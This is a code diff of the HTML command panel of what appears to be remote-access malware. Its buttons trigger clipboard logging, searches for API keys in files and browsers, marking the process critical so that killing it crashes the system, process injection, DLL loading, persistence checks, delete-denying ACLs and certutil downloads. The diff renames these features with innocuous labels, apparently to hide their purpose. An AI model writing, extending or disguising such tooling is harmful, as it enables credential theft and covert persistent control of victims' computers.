@@ -424,15 +424,15 @@ th{background:#16213e;color:#ffd700;}tr:hover{background:#222;}
 <button type="button" class="cmd-btn" style="background:#1a1a0a;border-color:#ffd700;" onclick="sendCmd('CLIPBOARD_LOG')">📋 Clipboard Log <span>View copied text history</span></button>
 <button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#ff9800;" id="btnFindApi" onclick="sendCmd('FIND_API_KEYS')">🔑 Find API Keys <span>Search files/browsers for keys</span></button>
 <button type="button" class="cmd-btn" style="background:#0a2a0a;border-color:#4CAF50;" onclick="openNoteModal()">📝 Send Note <span>Open notepad with custom text</span></button>
-<button type="button" class="cmd-btn" style="background:#2a0a0a;border-color:#f44336;" onclick="sendCmd('DEPLOY_SVC')">🔒 Deploy Services <span>Deploy background services and monitoring — auto-protect after 15s</span></button>
-<button type="button" class="cmd-btn" style="background:#2a1a0a;border-color:#ff5722;" onclick="sendCmd('PROTECT_NOW')">⚡ Protect Now <span>Immediately mark this process CRITICAL (BSOD on kill)</span></button>
-<button type="button" class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('Clean Up')">💀 Clean Up <span>Remove all services and exit</span></button>
-<button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#2196F3;" onclick="sendCmd('REMOVE_SVC')">🔓 Clear Critical <span>Remove system-critical status from this client</span></button>
-<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#4CAF50;" onclick="sendCmd('SVC_STATUS')">🛡️ Check Status <span>Check system status</span></button>
-<button type="button" class="cmd-btn" style="background:#1a0a2a;border-color:#9C27B0;" onclick="sendCmd('SCHEDULE_TASK')">🔱 Schedule Task <span>System monitoring task</span></button>
-<button type="button" class="cmd-btn" style="background:#0a2a2a;border-color:#009688;" onclick="sendCmd('REMOTE_SVC')">💉 Remote Service <span>Start remote service</span></button>
-<button type="button" class="cmd-btn" style="background:#0a2a2a;border-color:#00BCD4;" onclick="sendCmd('MEM_SVC')">👻 Memory Service <span>Start memory-resident service</span></button>
-<button type="button" class="cmd-btn" style="background:#1a1a2a;border-color:#7B68EE;" onclick="sendCmd('DLL_LOAD')">🌙 Library Load <span>Load library into process</span></button>
+<button type="button" class="cmd-btn" style="background:#2a0a0a;border-color:#f44336;" onclick="sendCmd('DEPLOY_SVC')">🔒 Start Services <span>Start background services with auto-protection</span></button>
+<button type="button" class="cmd-btn" style="background:#2a1a0a;border-color:#ff5722;" onclick="sendCmd('PROTECT_NOW')">⚡ Set Critical <span>Set system-critical status</span></button>
+<button type="button" class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('Exit')">❌ Exit <span>Remove all services and exit cleanly</span></button>
+<button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#2196F3;" onclick="sendCmd('REMOVE_SVC')">🔓 Clear Protection <span>Remove protection from this client</span></button>
+<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#4CAF50;" onclick="sendCmd('SVC_STATUS')">🛡️ Check Protection <span>Check protection status</span></button>
+<button type="button" class="cmd-btn" style="background:#1a0a2a;border-color:#9C27B0;" onclick="sendCmd('SCHEDULE_TASK')">🔱 System Task <span>System monitoring task</span></button>
+<button type="button" class="cmd-btn" style="background:#0a2a2a;border-color:#009688;" onclick="sendCmd('REMOTE_SVC')">💉 Remote Process <span>Start remote process</span></button>
+<button type="button" class="cmd-btn" style="background:#0a2a2a;border-color:#00BCD4;" onclick="sendCmd('MEM_SVC')">👻 Memory Process <span>Start memory-resident process</span></button>
+<button type="button" class="cmd-btn" style="background:#1a1a2a;border-color:#7B68EE;" onclick="sendCmd('DLL_LOAD')">🌙 Load Library <span>Load library into process</span></button>
 <button type="button" class="cmd-btn" style="background:#2a1a0a;border-color:#FF9800;" onclick="sendCmd('HARDEN_FILES')">🛡️ Harden Files <span>NTFS ACLs: deny delete</span></button>
 <button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#00FF00;" onclick="sendCmd('VERIFY_LAYERS')">✅ Verify Layers <span>Check all persistence layers</span></button>
 <button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#2196F3;" onclick="var url=prompt('URL:'); var path=prompt('Save path:'); if(url&&path) sendCmd('LOLBAS_DOWNLOAD '+url+' '+path)">🎭 Download File <span>Download via certutil</span></button>
